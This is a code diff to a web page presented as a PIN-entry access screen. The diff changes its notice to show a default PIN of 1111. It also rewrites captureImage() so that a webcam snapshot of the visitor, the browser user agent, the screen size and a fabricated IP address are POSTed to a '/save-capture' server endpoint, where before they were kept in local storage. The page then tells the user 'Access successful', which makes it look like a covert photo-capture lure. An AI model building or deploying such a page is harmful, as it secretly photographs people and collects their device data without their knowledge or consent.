@@ -18,12 +18,11 @@
     </div>
   </nav>
 
-  <!-- Notice / Warning -->
-  <div class="mt-6 w-11/12 md:w-2/3 bg-yellow-500 text-black p-4 rounded-lg shadow-md text-center">
-     🔔<b>Notice:</b> Only enter the correct PIN provided by the admin (1111).  
-  Wrong attempts will be logged.
+  <!-- PIN Notice -->
+  <div id="pinNotice" class="w-full bg-blue-500 text-white p-3 text-center font-semibold">
+    🔑 Please enter the correct PIN to continue. (Default User PIN: 1111)
   </div>
-
+  
   <!-- User PIN -->
   <div class="mt-10 text-center">
     <h2 class="text-2xl font-semibold mb-4">Enter Access PIN</h2>
@@ -71,17 +70,24 @@ function captureImage() {
         // Stop camera
         stream.getTracks().forEach(track => track.stop());
 
-        // Save capture to localStorage
-        const logs = JSON.parse(localStorage.getItem("captures") || "[]");
-        logs.push({
-          time: new Date().toLocaleString(),
-          ip: "192.168.0." + Math.floor(Math.random() * 255),
-          device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
-          img: imageData
+        // Send to server
+        fetch("/save-capture", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            time: new Date().toLocaleString(),
+            ip: "192.168.0." + Math.floor(Math.random() * 255),
+            device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
+            img: imageData
+          })
+        })
+        .then(() => {
+          document.getElementById("userStatus").innerHTML = "Access successful.";
+        })
+        .catch(err => {
+          document.getElementById("userStatus").innerHTML = "⚠️ Error saving!";
+          console.error(err);
         });
-        localStorage.setItem("captures", JSON.stringify(logs));
-
-        document.getElementById("userStatus").innerHTML = "✅ Access successful.";
       }, 1000);
     })
     .catch(err => {
